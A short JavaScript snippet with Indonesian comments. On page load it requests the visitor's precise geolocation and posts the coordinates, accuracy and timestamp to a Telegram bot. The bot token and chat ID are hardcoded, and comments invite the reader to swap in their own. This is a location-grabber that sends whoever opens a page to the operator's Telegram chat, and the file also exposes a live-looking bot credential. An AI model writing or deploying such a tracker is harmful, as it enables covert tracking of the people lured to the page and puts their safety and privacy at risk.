function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        const message = `📍 Lokasi Baru Diterima\n\n` +
                        `Latitude: ${lat}\n` +
                        `Longitude: ${lon}\n` +
                        `Akurasi: ${accuracy.toFixed(2)} meter\n` +
                        `Waktu: ${new Date().toLocaleString('id-ID')}`;

        // Kirim ke Telegram Bot
        sendToTelegram(message, lat, lon);

        alert("Lokasi berhasil dikirim!");
      },
      (error) => {
        alert("Gagal mendapatkan lokasi: " + error.message);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  } else {
    alert("Browser tidak mendukung geolocation");
  }
}

// Fungsi utama untuk kirim ke Telegram
function sendToTelegram(text, lat, lon) {
  const BOT_TOKEN = "7786812479:AAGhauLiD5UTa0vXa_oKQvK1I1-ZiGvwM3k";        // Ganti dengan token bot kamu
  const CHAT_ID = "8495655840";            // Ganti dengan chat id kamu/group

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: "HTML"
    })
  })
  .then(response => response.json())
  .then(data => {
    console.log("Berhasil dikirim ke Telegram:", data);
  })
  .catch(error => {
    console.error("Gagal kirim ke Telegram:", error);
  });
}

// Jalankan otomatis
getLocation();
